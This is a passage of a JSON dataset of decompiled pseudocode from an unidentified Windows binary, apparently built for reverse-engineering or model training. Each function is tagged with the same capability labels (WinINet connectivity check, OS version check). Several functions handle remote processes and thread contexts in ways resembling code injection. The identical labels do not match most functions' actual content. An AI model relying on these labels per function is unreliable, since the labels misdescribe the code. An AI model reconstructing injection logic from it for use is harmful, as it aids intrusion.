{\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                if (var_d8h == var_ch) {\n                                    var_28h = fcn.0005a640(var_20h, var_16ch + 0x6c, 0, &var_24h, 2);\n                                    if (var_28h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005a10a;\n                                    }\n                                    if ((var_24h != 0) && (var_24h != -1)) {\n                                        var_24h._0_2_ = var_24h + -1;\n                                        var_28h = fcn.0005a680(var_20h, var_16ch + 0x6c, 0, &var_24h, 2);\n                                        if (var_28h != 0) {\n                                            var_4h = 0xffffffff;\n                                            goto code_r0x0005a10a;\n                                        }\n                                    }\n                                    var_28h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                var_170h = var_40h;\n                            }\ncode_r0x0005a0e3:\n                            var_28h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x0005a10a:\n    if (var_20h != 0) {\n        fcn.000789b4(var_20h);\n    }\ncode_r0x0005a11c:\n    *in_FS_OFFSET = var_10h;\n    return var_28h;\n}\n",
        "token_count": 1927
    },
    "0005a130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005a130(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.0005a4f0(arg_8h, &var_1h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0005a190(arg_8h, var_1h == '\\0', arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 141
    },
    "0005a190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nint32_t __cdecl fcn.0005a190(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_4h;\n    \n    if (arg_ch != '\\0') {\n        iVar1 = fcn.00078a50(arg_8h, 0, &var_1ch, 0x18, 0);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        *arg_10h = var_18h;\n        return (-(*arg_10h != 0) & 0xdea6fffb) + 0x21590005;\n    }\n    var_24h = 0;\n    var_20h = 0;\n    if (arg_8h == -1) {\n        var_24h = -2;\n    }\n    else {\n        var_4h = fcn.0005a2c0(arg_8h, 0x48, &var_24h);\n        if (var_4h != 0) goto code_r0x0005a29d;\n    }\n    var_4h = fcn.000206b0(var_24h, 0, &var_40h, 0x1c, 0);\n    if (var_4h == 0) {\n        if ((var_3ch == 0) || (var_3ch == 0xffffdfd0)) {\n            var_4h = 0x21590005;\n        }\n        else {\n            var_4h = fcn.0005a640(arg_8h, var_3ch + 0x2030, 0xffffdfcf < var_3ch, &var_20h, 4);\n            if (var_4h == 0) {\n                *arg_10h = var_20h;\n                var_4h = (-(*arg_10h != 0) & 0xdea6fffb) + 0x21590005;\n            }\n        }\n    }\ncode_r0x0005a29d:\n    if (var_24h != 0) {\n        fcn.000789b4(var_24h);\n    }\n    return var_4h;\n}\n",
        "token_count": 584
    },
    "0005a2c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a2c0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    int32_t var_8h;\n    \n    var_40h = NULL;\n    if (arg_10h == 0) {\n        var_24h = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00078a50(arg_8h, 0, &var_18h, 0x18, 0);\n        if (iVar1 == 0) {\n            var_20h = var_8h;\n            var_24h = fcn.00034cf0(5, &var_40h);\n            if (var_24h == 0) {\n                if (var_40h == NULL) {\n                    var_24h = 0x21590005;\n                }\n                else {\n                    var_24h = 0x21590005;\n                    for (var_1ch = var_40h; var_1ch != NULL; var_1ch = var_1ch + *var_1ch) {\n                        if ((var_1ch[0x11] == var_20h) && (var_1ch[1] != 0)) {\n                            var_3ch = 0x18;\n                            var_38h = 0;\n                            var_30h = 0;\n                            var_34h = 0;\n                            var_2ch = 0;\n                            var_28h = 0;\n                            iVar1 = fcn.00078b94(arg_10h, arg_ch, &var_3ch, var_1ch + 0x36);\n                            if (iVar1 == 0) {\n                                var_24h = 0;\n                            }\n                            else {\n                                var_24h = 0x21590008;\n                            }\n                            break;\n                        }\n                        if (*var_1ch == 0) break;\n                    }\n                }\n            }\n        }\n        else {\n            var_24h = 0x21590008;\n        }\n        if (var_40h != NULL) {\n            fcn.000357f0(var_40h);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 585
    },
    "0005a3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a3f0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = NULL;\n    if (arg_ch == NULL) {\n        var_10h = 0x21590067;\n    }\n    else {\n        var_10h = fcn.00034cf0(5, &var_8h);\n        if (var_10h == 0) {\n            var_ch = var_8h;\n            do {\n                if (var_ch[0x11] == arg_8h) break;\n                var_ch = var_ch + *var_ch;\n            } while (*var_ch != 0);\n            if ((var_ch[0x11] == arg_8h) && (var_ch[1] != 0)) {\n                for (var_4h = 0; var_4h < var_ch[1]; var_4h = var_4h + 1) {\n                    *arg_ch = var_ch[var_4h * 0x10 + 0x37];\n                    iVar1 = fcn.0005a620();\n                    if ((arg_8h != iVar1) || (iVar1 = fcn.0005a630(),  *arg_ch != iVar1)) break;\n                }\n                if (var_4h < var_ch[1]) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 0x21590005;\n                }\n            }\n            else {\n                var_10h = 0x21590005;\n            }\n        }\n        fcn.000357f0(var_8h);\n    }\n    return var_10h;\n}\n",
        "token_count": 416
    },
    "0005a4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a4f0(uint arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00078a50(arg_8h, 0x1a, &var_4h, 4, 0);\n    if (iVar1 == -0x3ffffffd) {\n        *arg_ch = 0;\n        iVar1 = 0;\n    }\n    else if (iVar1 == 0) {\n        *arg_ch = var_4h != 0;\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "0005a540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005a540(int32_t arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_8h == 0) {\n        *arg_ch = 1;\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0005a4f0(arg_8h, &var_1h);\n        if (iVar1 == 0) {\n            if (var_1h == '\\0') {\n                iVar1 = fcn.0005a4f0(0xffffffff, &var_1h);\n                if (iVar1 == 0) {\n                    if (var_1h == '\\0') {\n                        *arg_ch = 1;\n                        iVar1 = 0;\n                    }\n                    else {\n                        *arg_ch = 0;\n                        iVar1 = 0;\n                    }\n                }\n            }\n            else {\n                *arg_ch = 1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 292
    },
    "0005a5e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a5e0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.0005a7d0(&var_4h, 0x400, arg_8h);\n    if (var_8h == 0) {\n        var_8h = fcn.0005a540(var_4h, arg_ch);\n    }\n    return var_8h;\n}\n",
        "token_count": 117
    },
    "0005a640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a640(int32_t arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        fcn.00078be8(arg_14h, arg_ch, arg_18h);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00035660(arg_8h, arg_ch, arg_14h, arg_18h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "0005a680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a680(int32_t arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        fcn.00078be8(arg_ch, arg_14h, arg_18h);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00035690(arg_8h, arg_ch, arg_14h, arg_18h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "0005a6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a6c0(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = 0x21590066;\n    }\n    else if ((arg_10h == NULL) || (*arg_10h == 0)) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_8h == 0) {\n        iVar1 = fcn.000356f0(*arg_10h);\n        *arg_ch = iVar1;\n        iVar1 = (-(*arg_ch != 0) & 0xdea6fffc) + 0x21590004;\n    }\n    else {\n        iVar1 = fcn.00078bac(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n        if (iVar1 != 0) {\n            *arg_ch = 0;\n            iVar1 = fcn.00078bac(arg_8h, arg_ch, 0, arg_10h, 0x2000, 0x40);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n        }\n        iVar1 = fcn.00078bac(arg_8h, arg_ch, 0, arg_10h, 0x1000, 0x40);\n    }\n    return iVar1;\n}\n",
        "token_count": 340
    },
    "0005a790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a790(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.000357f0(arg_ch);\n        uVar1 = 0;\n    }\n    else {\n        var_4h = 0;\n        uVar1 = fcn.00078ba0(arg_8h, &arg_ch, &var_4h, 0x8000);\n    }\n    return uVar1;\n}\n",
        "token_count": 125
    },
    "0005a7d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005a7d0(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg_10h == 0) {\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        var_20h = 0x18;\n        var_1ch = 0;\n        var_14h = 0x200;\n        var_18h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = arg_10h;\n        var_4h = 0;\n        uVar1 = fcn.00078a74(arg_8h, arg_ch, &var_20h, &var_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 281
    },
    "0005a870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a870(int32_t arg_8h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.0005a3f0(*(arg_8h + 0x17), arg_8h + 0x2f);\n    if (var_1ch == 0) {\n        var_18h = 0x18;\n        var_14h = 0;\n        var_ch = 0x200;\n        var_10h = 0;\n        var_8h = 0;\n        var_4h = 0;\n        var_1ch = fcn.00078ab0(arg_8h + 0x43, 0x10000000, &var_18h, 0, 0);\n        if (var_1ch == 0) {\n            *(arg_8h + 0x53) = 0;\n            *(arg_8h + 0x57) = 0;\n            *(arg_8h + 0x5b) = 0;\n            *(arg_8h + 0x5f) = 0;\n        }\n    }\n    return var_1ch;\n}\n",
        "token_count": 309
    },
    "0005a910": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005a910(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.0001a970(*(arg_8h + 0x17), *(arg_8h + 0x2f), 0, 0, 0x8009aac0, arg_8h, 0);\n    if (var_8h == 0) {\n        var_10h = -150000000;\n        var_ch = 0xffffffff;\n        var_8h = fcn.00078a62(*(arg_8h + 0x43), 0, &var_10h);\n        if (var_8h == 0x102) {\n            fcn.00071080(arg_8h + 0x53, 1);\n            var_10h = 100;\n            while ((iVar1 = fcn.000533b0(arg_8h + 0x5b, 0, 0),  iVar1 != 0 && (var_10h != 0))) {\n                fcn.00043cb0(100);\n                var_10h = var_10h + -1;\n            }\n            if ((var_10h == 0) || (iVar1 = fcn.000533b0(arg_8h + 0x53, 0, 0),  iVar1 != 0)) {\n                *(arg_8h + 0x2b) = 0;\n            }\n        }\n        else {\n            *(arg_8h + 0x2b) = 0;\n        }\n        if (var_8h == 0) {\n            while (iVar1 = fcn.000533b0(arg_8h + 0x5b, 0, 0),  iVar1 != 0) {\n                fcn.00043cb0(100);\n            }\n            if ((*(arg_8h + 0x4b) | *(arg_8h + 0x4f)) == 0) {\n                var_8h = -1;\n            }\n            else {\n                var_8h = fcn.00078b22();\n                if ((var_8h == 0) && (var_8h = fcn.000206b0(var_4h, 0, &var_2ch, 0x1c, 0),  var_8h == 0)) {\n                    if (var_2ch == 1) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_8h = -0x3fffffff;\n                    }\n                }\n            }\n        }\n    }\n    if (var_4h != 0) {\n        fcn.000789b4(var_4h);\n    }\n    fcn.000789b4(*(arg_8h + 0x43));\n    return var_8h;\n}\n",
        "token_count": 700
    },
    "0005aac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0005aac0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00071080(arg_8h + 0x5b, 1);\n        iVar1 = fcn.000533b0(arg_8h + 0x53, 0, 0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0005adf0(*(arg_8h + 0x17), arg_8h, arg_8h + 0x4b);\n            if (iVar1 == 0) {\n                var_8h = 0xf70f2e80;\n                var_4h = 0xffffffff;\n                iVar1 = fcn.00078a62(*(arg_8h + 0x4b), 0, &var_8h);\n                if (iVar1 != 0) {\n                    fcn.00020570(*(arg_8h + 0x4b), 0);\n                    fcn.000789b4(*(arg_8h + 0x4b));\n                    fcn.00043cb0(500);\n                    *(arg_8h + 0x4b) = 0;\n                    *(arg_8h + 0x4f) = 0;\n                }\n            }\n            fcn.000789a2(*(arg_8h + 0x43), 0);\n            fcn.00071080(arg_8h + 0x5b, 0);\n        }\n        else {\n            fcn.00071080(arg_8h + 0x53, 0);\n            fcn.00071080(arg_8h + 0x5b, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 420
    },
    "0005abb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005abb0(uint arg_8h, uint *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    arg_ch[3] = 0;\n    arg_ch[4] = 0;\n    if (arg_10h < 0x100000) {\n        var_18h = 0x100000;\n    }\n    else {\n        var_18h = arg_10h;\n    }\n    var_14h = var_18h;\n    arg_ch[4] = 0;\n    var_8h = fcn.00078bac(arg_8h, arg_ch + 4, 0, &var_14h, 0x2000, 4);\n    if (var_8h == 0) {\n        arg_ch[2] = arg_ch[4] + var_14h;\n        if (arg_14h < 0x2000) {\n            var_1ch = 0x2000;\n        }\n        else {\n            var_1ch = arg_14h + 0x1000;\n        }\n        var_ch = var_1ch;\n        if (var_14h <= var_1ch) {\n            var_ch = var_14h - 0x1000;\n        }\n        arg_ch[3] = arg_ch[2] - var_ch;\n        var_8h = fcn.00078bac(arg_8h, arg_ch + 3, 0, &var_ch, 0x1000, 4);\n        if (var_8h == 0) {\n            var_ch = 0x1000;\n            var_10h = arg_ch[3];\n            var_8h = fcn.000201d0(arg_8h, &var_10h, &var_ch, 0x104, &var_4h);\n        }\n    }\n    if (var_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        var_ch = 0;\n        fcn.00078ba0(arg_8h, arg_ch + 4, &var_ch, 0x8000);\n        uVar1 = fcn.00078a2c(var_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 598
    },
    "0005ad00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005ad00(uint arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t var_4h;\n    \n    fcn.00078bfa(arg_ch, 0, 0x2cc);\n    *arg_ch = 0x10007;\n    arg_ch[0x23] = 0;\n    arg_ch[0x24] = 0x38;\n    arg_ch[0x25] = 0x20;\n    arg_ch[0x26] = 0x20;\n    arg_ch[0x32] = 0x20;\n    arg_ch[0x2f] = 0x18;\n    arg_ch[0x30] = 0x3000;\n    arg_ch[0x31] = arg_10h + -4;\n    var_4h = fcn.0005a680(arg_8h, arg_ch[0x31], 0, &arg_18h, 4);\n    if (var_4h == 0) {\n        arg_ch[0x31] = arg_ch[0x31] + -4;\n        arg_ch[0x2e] = arg_14h;\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 304
    },
    "0005adf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005ae59)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005adf0(uint noname_0, int32_t arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_49h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_8ch = 0;\n    var_4h = 0;\n    var_ch = 0;\n    var_84h = 0;\n    var_18h = 0;\n    var_88h = fcn.0005a540(0xffffffff, &var_49h);\n    if ((var_88h == 0) && (var_88h = fcn.0005abb0(0xffffffff, &var_28h, 0, 0),  var_88h == 0)) {\n        var_4h = fcn.000356c0(0x500);\n        if (var_4h == 0) {\n            var_88h = 0x21590004;\n        }\n        else {\n            var_88h = fcn.0005ad00(0xffffffff, var_4h, var_20h, *(arg_ch + 0x23), *(arg_ch + 0x33));\n            if (var_88h == 0) {\n                var_44h = 0x18;\n                var_40h = 0;\n                var_38h = 0;\n                var_3ch = 0;\n                var_34h = 0;\n                var_30h = 0;\n                var_88h = fcn.00020360(&var_8h, 0x1f03ff, &var_44h, 0xffffffff, &var_14h, var_4h, &var_28h, 1);\n                if (((var_88h == 0) && (var_88h = fcn.00034f60(var_8h, &var_8ch),  var_88h == 0)) &&\n                   (var_88h = fcn.0005b0d0(&var_ch),  var_88h == 0)) {\n                    iVar1 = fcn.00034f60(var_ch, &var_84h);\n                    if (iVar1 != 0) {\n                        var_84h = var_ch;\n                    }\n                    fcn.00078bfa(&var_80h, 0, 0x34);\n                    var_80h._2_2_ = 0x34;\n                    var_80h._0_2_ = 0x1c;\n                    var_64h = 0x10001;\n                    var_54h = var_14h;\n                    var_50h = var_10h;\n                    var_58h = var_8h;\n                    var_88h = fcn.00078b9a(var_84h, &var_80h, &var_80h);\n                    if (var_88h == 0) {\n                        if (var_60h == 0) {\n                            var_2ch = 0x1f;\n                            fcn.00078ba6(var_8ch, 2, &var_2ch, 4);\n                            var_88h = fcn.00020310(var_8ch, 0);\n                        }\n                        else {\n                            var_88h = var_60h;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00034fb0(var_ch, var_84h);\n    fcn.000357f0(var_4h);\n    if (var_88h == 0) {\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    else {\n        if (var_8ch != 0) {\n            fcn.00020570(var_8ch, 0);\n            fcn.000789b4(var_8h);\n            fcn.00043cb0(500);\n        }\n        if (var_18h != 0) {\n            stack0xffffffb4 = 0;\n            fcn.00078ba0(0xffffffff, &var_18h, &var_49h + 1, 0x8000);\n        }\n    }\n    fcn.00034fb0(var_8h, var_8ch);\n    return var_88h;\n}\n",
        "token_count": 1159
    },
    "0005b0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005b0d0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_284h;\n    uint32_t var_280h;\n    int32_t var_27ch;\n    int32_t var_278h;\n    int32_t var_274h;\n    uint var_270h;\n    uint var_269h;\n    int32_t var_1cch;\n    int32_t var_1c8h;\n    uint *var_1c0h;\n    uint var_ch;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_270h = 0;\n    var_280h = 0;\n    var_274h = 0;\n    var_269h._0_1_ = '\\0';\n    var_5h = '\\0';\n    if (arg_8h == NULL) {\n        var_27ch = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.0005a620(0x8005573c, 0, 1, &var_ch);\n        var_27ch = fcn.000595a0(uVar1);\n        if ((var_27ch == 0) && (var_27ch = fcn.0005cd70(var_ch, 0x80055750, &var_284h),  var_27ch == 0)) {\n            fcn.000610a0(&var_269h + 1);\n            fcn.00061140(&var_269h + 1, 0x20);\n            var_280h = var_284h;\n            var_278h = 0x1000 - (var_284h & 0xfff);\n            iVar2 = fcn.0001afc0(var_284h, var_278h, 0, &var_4h);\n            if (iVar2 == 0) {\n                var_269h._0_1_ = '\\x01';\n                var_274h = (var_280h & 0xfffff000) + 0x1000;\n                iVar2 = fcn.0001afc0(var_274h, 0x1000, 0, &var_270h);\n                if (iVar2 == 0) {\n                    var_5h = '\\x01';\n                    var_278h = var_278h + 0x1000;\n                }\n                fcn.00060ce0(&var_269h + 1, var_284h, var_278h);\n                do {\n                    iVar2 = fcn.000610e0(&var_269h + 1);\n                    if (iVar2 == 0) goto code_r0x0005b2aa;\n                    if (var_1cch == 0x1be) {\n                        var_27ch = -1;\n                        goto code_r0x0005b2aa;\n                    }\n                } while ((var_1cch != 0x1ad) || (var_1c8h != 0x8d));\n                *arg_8h = *var_1c0h;\n                var_27ch = 0;\ncode_r0x0005b2aa:\n                fcn.00061b20(1);\n            }\n            else {\n                var_27ch = -1;\n            }\n        }\n        if (var_5h != '\\0') {\n            fcn.0001b0a0(var_274h, var_270h);\n        }\n        if (var_269h != '\\0') {\n            fcn.0001b0a0(var_280h, var_4h);\n        }\n    }\n    return var_27ch;\n}\n",
        "token_count": 844
    },
    "0005b300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005b300(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    *(arg_8h + 0x77) = 1;\n    var_4h = fcn.0005d070(*(arg_8h + 0x17), *(arg_8h + 0xf), 0x8005193c, arg_8h + 0x97);\n    if ((var_4h == 0) && (var_4h = fcn.0005a870(arg_8h),  var_4h == 0)) {\n        *(arg_8h + 0x4b) = 0;\n        *(arg_8h + 0x4f) = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 184
    },
    "0005b390": {
        "rules": [
